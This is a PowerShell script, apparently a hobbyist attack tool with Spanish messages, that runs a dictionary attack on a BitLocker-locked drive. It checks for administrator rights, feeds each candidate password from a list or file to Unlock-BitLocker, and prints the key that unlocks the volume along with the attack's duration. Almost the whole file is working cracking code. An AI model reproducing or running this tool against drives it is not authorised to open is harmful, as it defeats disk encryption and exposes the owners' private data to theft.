function IsAdmin {
    $User = [Security.Principal.WindowsIdentity]::GetCurrent();
    (New-Object Security.Principal.WindowsPrincipal $User).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)  
}

function Invoke-Bitlocker-BruteForce {
	param (
		[CmdLetBinding()]
		$Unidad,
		$Diccionario
	)
	$Color = @{
		'Banner' = "White"
		'Notificacion' = "Cyan"
		'Notificacion2' = "Red"
		'Exito' = "Green"
		'Error' = "Red"
	}
	$ascii = @"
 ______  _       _             _                    ______                          _______                           
(____  \(_)  _  | |           | |                  (____  \               _        (_______)                          
 ____)  )_ _| |_| | ___   ____| |  _ _____  ____    ____)  ) ____ _   _ _| |_ _____ _____ ___   ____ ____ _____  ____ 
|  __  (| (_   _) |/ _ \ / ___) |_/ ) ___ |/ ___)  |  __  ( / ___) | | (_   _) ___ |  ___) _ \ / ___) ___) ___ |/ ___)
| |__)  ) | | |_| | |_| ( (___|  _ (| ____| |      | |__)  ) |   | |_| | | |_| ____| |  | |_| | |  ( (___| ____| |    
|______/|_|  \__)\_)___/ \____)_| \_)_____)_|      |______/|_|   |____/   \__)_____)_|   \___/|_|   \____)_____)_|    
																													  
"@
	Clear-Host
	cmd /c "mode con:cols=120 lines=37"
	Write-Host $ascii -ForegroundColor $Color.Banner
	Write-Host "                                                                                                    by: H3ll0World" -ForegroundColor Red
	if (!(IsAdmin)) {
		Write-Host "[X] " -ForegroundColor $Color.Error -NoNewLine
		Write-Host "Error: No se ha ejecutado como administrador.."
		Write-Host "[!] " -ForegroundColor $Color.Notificacion2 -NoNewLine
		Write-Host "Quitando..."
		break
	}
	if (!($unidad -in $(Get-WmiObject Win32_LogicalDisk).DeviceID)) {
		Write-Host "[X] " -ForegroundColor $Color.Error -NoNewLine
		Write-Host "Error: La unidad $Unidad no ha sido encontrada."
		Write-Host "[!] " -ForegroundColor $Color.Notificacion2 -NoNewLine
		Write-Host "Quitando..."
		break
	} elseif ($(Get-BitLockerVolume -MountPoint $Unidad).LockStatus -eq "Unlocked") {
		Write-Host "[X] " -ForegroundColor $Color.Error -NoNewLine
		Write-Host "Error: La unidad $Unidad no tiene bitlocker activado."
		Write-Host "[!] " -ForegroundColor $Color.Notificacion2 -NoNewLine
		Write-Host "Quitando..."
		break
	}
	if ($Diccionario.GetType().Name -eq "Object[]") {
		$ContentDic = $Diccionario
		$CantidadPasswords = $ContentDic.Length
	} elseif ($Diccionario.GetType().Name -eq "String") {
		if ($(Test-Path $Diccionario)) {
			$ContentDic = Get-Content $Diccionario
			$CantidadPasswords = $ContentDic.Length
		} else {
			$ContentDic = $Diccionario
			$CantidadPasswords = 1
		}
	}
	Write-Host "[>] " -ForegroundColor $Color.Notificacion -NoNewLine
	Write-Host "Iniciando ataque por diccionario a la unidad $Unidad con $CantidadPasswords contraseña(s)"
	$HoraInicio = Get-Date
	Write-Host "[>] " -ForegroundColor $Color.Notificacion -NoNewLine
	Write-Host "Inicio: $HoraInicio`n"
	$LockedStatus = 
	foreach ($password in $ContentDic) {
		
		Write-Host "[>] " -ForegroundColor $Color.Notificacion -NoNewLine
		Write-Host "Intentando con: $password"
		$key = ConvertTo-SecureString -String $password -AsPlainText -Force
		$Error.Clear()
		try {
			Unlock-BitLocker -MountPoint $Unidad -Password $key -ErrorAction Stop
		} catch [System.Runtime.InteropServices.COMException] {
			if ($Error[0].Exception.HResult -eq -2144272345) {
				Write-Host "[!] " -ForegroundColor $Color.Notificacion2 -NoNewLine
				Write-Host "Clave incorrecta: $password"
			} elseif ($Error[0].Exception.HResult -eq -2144272376) {
				Write-Host "[X] " -ForegroundColor $Color.Notificacion2 -NoNewLine
				Write-Host "Error: La unidad $Unidad no tiene bitlocker activado.`nQuitando..."
				break
			}
		} finally {
			$ClaveCorrecta = $password
			if (Test-Path $Unidad) {
				Write-Host "`n[!] " -ForegroundColor $Color.Exito -NoNewLine
				Write-Host "Clave encontrada: $ClaveCorrecta"
				$HoraFin = Get-Date
				$Duracion = $HoraFin - $HoraInicio
				Write-Host "[>] " -ForegroundColor $Color.Notificacion -NoNewLine
				Write-Host "Fin: $HoraFin"
				Write-Host "[>] " -ForegroundColor $Color.Notificacion -NoNewLine
				Write-Host "Duracion del ataque: " -NoNewLine
				if ($Duracion.Days -ne 0) {Write-Host -NoNewLine "$($Duracion.Days) dia(s), "}
				if ($Duracion.Hours -ne 0) {Write-Host -NoNewLine "$($Duracion.Hours) hora(s), "}
				if ($Duracion.Minutes -ne 0) {Write-Host -NoNewLine "$($Duracion.Minutes) minuto(s), "}
				if ($Duracion.Seconds -ne 0) {Write-Host -NoNewLine "$($Duracion.Seconds) segundo(s), "}
				if ($Duracion.Milliseconds -ne 0) {Write-Host "$($Duracion.Milliseconds) milisegundo(s)"}
				#Invoke-Expression "Get-BitLockerVolume $Unidad"
				iex "break"
			}
			$Key = $Null
		}
	}
}